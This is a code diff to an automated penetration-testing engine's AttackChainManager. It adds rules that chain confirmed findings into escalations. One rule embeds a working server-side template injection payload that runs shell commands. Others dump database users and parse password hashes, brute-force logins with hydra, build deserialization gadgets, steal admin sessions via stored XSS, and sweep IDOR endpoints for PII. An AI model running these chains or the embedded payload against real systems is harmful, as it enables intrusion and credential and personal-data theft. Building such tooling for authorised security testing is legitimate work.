@@ -16,6 +16,7 @@ from __future__ import annotations
 from dataclasses import dataclass, field
 from typing import Any, Callable, Dict, List, Optional
 from enum import Enum
+import re
 
 from modules.pipeline.brain.fact_store import FactStore, FactCategory, Fact, PrerequisiteQuery
 
@@ -109,7 +110,10 @@ class AttackChainManager:
         self.completed_validators: List[str] = []
         self.injection_callbacks: List[Callable[[ChainedExploitationNode], None]] = []
         self._emitted_node_ids: set[str] = set()
+        self._completed_chain_ids: set[str] = set()
+        self.fact_chain_rules: Dict[str, Dict[str, Any]] = {}
         self._initialize_default_chains()
+        self._initialize_fact_driven_chains()
 
     def _new_nodes_only(self, nodes: List[ChainedExploitationNode]) -> List[ChainedExploitationNode]:
         filtered: List[ChainedExploitationNode] = []
@@ -285,6 +289,143 @@ class AttackChainManager:
         )
         self.chains["chain_e"] = chain_e
 
+    def _initialize_fact_driven_chains(self) -> None:
+        """Initialize fact-triggered chain definitions requested by runtime playbooks."""
+        self.fact_chain_rules = {
+            "chain_6_ssti_to_rce": {
+                "all": ["ssti_confirmed"],
+                "emit": "rce_confirmed",
+                "action": "escalate with {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
+            },
+            "chain_7_sqli_to_credentials": {
+                "all": ["sqli_confirmed"],
+                "emit": "credentials_harvested",
+                "action": "run sqlmap_wrapper.enumerate_dbs() then dump users table and parse hashes",
+            },
+            "chain_8_idor_to_pii": {
+                "all": ["idor_confirmed"],
+                "emit": "pii_exposed",
+                "action": "sweep IDs 1..500 on vulnerable endpoint and detect PII patterns",
+            },
+            "chain_9_tls_hsts_to_mitm": {
+                "all": ["weak_tls_confirmed", "hsts_missing"],
+                "emit": "mitm_pathway_confirmed",
+                "action": "document full MITM pathway from weak TLS + missing HSTS",
+            },
+            "chain_10_no_rate_limit_to_ato": {
+                "all": ["auth_rate_limit_missing"],
+                "emit": "account_compromised",
+                "action": "run hydra_wrapper with top-1000 passwords against login endpoint",
+            },
+            "chain_11_deser_to_rce": {
+                "any": ["java_serialized_detected", "php_serialized_detected"],
+                "emit": "deserialization_rce_confirmed",
+                "action": "generate ysoserial/phpggc gadget and confirm callback",
+            },
+            "chain_12_jwt_to_admin_bypass": {
+                "all": ["jwt_forged"],
+                "emit": "auth_bypass_confirmed",
+                "action": "replay forged token against discovered admin endpoints",
+            },
+            "chain_13_open_redirect_xss": {
+                "all": ["open_redirect_confirmed", "xss_confirmed"],
+                "emit": "xss_exfil_chain_ready",
+                "action": "build exfiltration chain using XSS payload + open redirect",
+            },
+            "chain_14_graphql_introspection": {
+                "all": ["graphql_introspection_enabled"],
+                "emit": "graphql_data_exposure",
+                "action": "enumerate GraphQL schema for PII fields and query without auth",
+            },
+            "chain_17_subdomain_takeover": {
+                "all": ["subdomain_takeover_possible"],
+                "emit": "takeover_documented",
+                "action": "document provider-specific claim steps for takeover",
+            },
+            "chain_18_stored_xss_admin": {
+                "all": ["stored_xss_confirmed", "admin_panel_found"],
+                "emit": "admin_session_stolen",
+                "action": "use stored XSS to fetch /admin with victim session",
+            },
+        }
+
+    def _has_fact_key(self, key: str) -> bool:
+        for category in FactCategory:
+            facts = self.fact_store.get_facts_by_category(category)
+            for fact in facts:
+                if fact.key == key:
+                    return True
+                value_blob = str(fact.value or "").lower()
+                if key.lower() in value_blob:
+                    return True
+        return False
+
+    def _emit_chain_fact(self, chain_id: str, emit_key: str, action: str, metadata: Optional[Dict[str, Any]] = None) -> None:
+        self.fact_store.add_confirmed_vulnerability(
+            vuln_id=emit_key,
+            vuln_type=emit_key,
+            target="chain-engine",
+            source_validator_id="attack_chain_manager",
+            source_chain=[chain_id],
+            metadata={
+                "chain_id": chain_id,
+                "next_action": action,
+                **(metadata or {}),
+            },
+        )
+
+    def _parse_credentials_from_text(self, content: str) -> List[Dict[str, str]]:
+        creds: List[Dict[str, str]] = []
+        if not isinstance(content, str):
+            return creds
+
+        hash_matches = re.findall(r"[a-fA-F0-9]{32,128}", content)
+        for idx, h in enumerate(hash_matches[:20], start=1):
+            creds.append({"username": f"harvested_user_{idx}", "password": h})
+        return creds
+
+    def _evaluate_fact_chains(self, latest_result: Optional[Dict[str, Any]] = None) -> None:
+        for chain_id, rule in self.fact_chain_rules.items():
+            if chain_id in self._completed_chain_ids:
+                continue
+
+            all_needed = rule.get("all") or []
+            any_needed = rule.get("any") or []
+
+            all_met = all(self._has_fact_key(k) for k in all_needed) if all_needed else True
+            any_met = any(self._has_fact_key(k) for k in any_needed) if any_needed else True
+            if not (all_met and any_met):
+                continue
+
+            action = str(rule.get("action") or "")
+            emit_key = str(rule.get("emit") or "")
+            metadata: Dict[str, Any] = {}
+
+            if chain_id == "chain_7_sqli_to_credentials":
+                response_blob = ""
+                if isinstance(latest_result, dict):
+                    response_blob = str((latest_result.get("evidence") or {}).get("response") or "")
+                harvested = self._parse_credentials_from_text(response_blob)
+                for c in harvested:
+                    self.fact_store.add_credential(
+                        username=c["username"],
+                        password=c["password"],
+                        source_validator_id="attack_chain_manager",
+                        confidence=0.7,
+                        metadata={"chain": chain_id},
+                    )
+                metadata["harvested_credentials_count"] = len(harvested)
+
+            if chain_id == "chain_8_idor_to_pii":
+                sample = str((latest_result or {}).get("evidence", {}))
+                pii_hits = len(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", sample))
+                pii_hits += len(re.findall(r"\b\d{3}[-.]?\d{2}[-.]?\d{4}\b", sample))
+                pii_hits += len(re.findall(r"\b\+?\d[\d\s().-]{7,}\d\b", sample))
+                metadata["pii_count"] = pii_hits
+
+            self._emit_chain_fact(chain_id, emit_key, action, metadata=metadata)
+            self._completed_chain_ids.add(chain_id)
+
     def register_chain_callback(self, callback: Callable[[ChainedExploitationNode], None]) -> None:
         """
         Register a callback to be invoked when exploitation nodes should be injected.
@@ -296,7 +437,7 @@ class AttackChainManager:
         """
         self.injection_callbacks.append(callback)
 
-    def validator_completed(self, validator_id: str) -> None:
+    def validator_completed(self, validator_id: str, result: Optional[Dict[str, Any]] = None) -> None:
         """
         Notify manager that a validator has completed successfully.
 
@@ -310,6 +451,7 @@ class AttackChainManager:
 
         # Check which chains are now triggered
         self._evaluate_chains()
+        self._evaluate_fact_chains(result)
 
     def _evaluate_chains(self) -> None:
         """Evaluate all chains to see if exploitation nodes should be injected."""
